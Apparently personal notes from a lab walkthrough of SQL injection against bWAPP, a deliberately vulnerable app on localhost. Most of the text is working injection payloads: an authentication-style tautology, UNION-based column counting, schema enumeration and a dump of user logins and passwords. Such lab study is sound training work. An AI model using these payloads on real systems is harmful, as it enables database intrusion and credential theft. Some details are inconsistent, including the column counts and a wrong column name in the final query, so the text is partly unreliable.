1)  We will check for input that the website accepts. If I do `'1-- - ` (notice the space), I get a response of "No movies were found!", which means the site accepted the syntax. Some other commands threw SQL SYNTAX ERRORS.
Now to see all the movies `' or '1'='1-- -` . We get 10 movies.

Notice that the url changed to `http://localhost/bWAPP/sqli_1.php?title=&action=search`

That's probably what we will use for the sqli.

2) We can use union for enumeration. `'union select 1,2,3,4,5,6,7,8-- -`
We brute force the number of columns until we reach an error. So the number will be one before the error. In our case it is 1-7 columns.
3) In the output we get 5 columns.
4) To see the user `'union select 1,user(),3,4,5,6,7-- -`
5) To see the database `'union select 1,database(),3,4,5,6,7-- -`
6) To get all the table names in the db`'union select 1,TABLE_NAME,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES-- -`
7) This give all tables and all columns don't use the WHERE filter. `'union select 1,2,TABLE_NAME,COLUMN_NAME,5,6,7 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -`
8) To get all users and passwords `'union select 1,2,login,password,5,6,7 FROM users-- -`

select table_schema_name, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
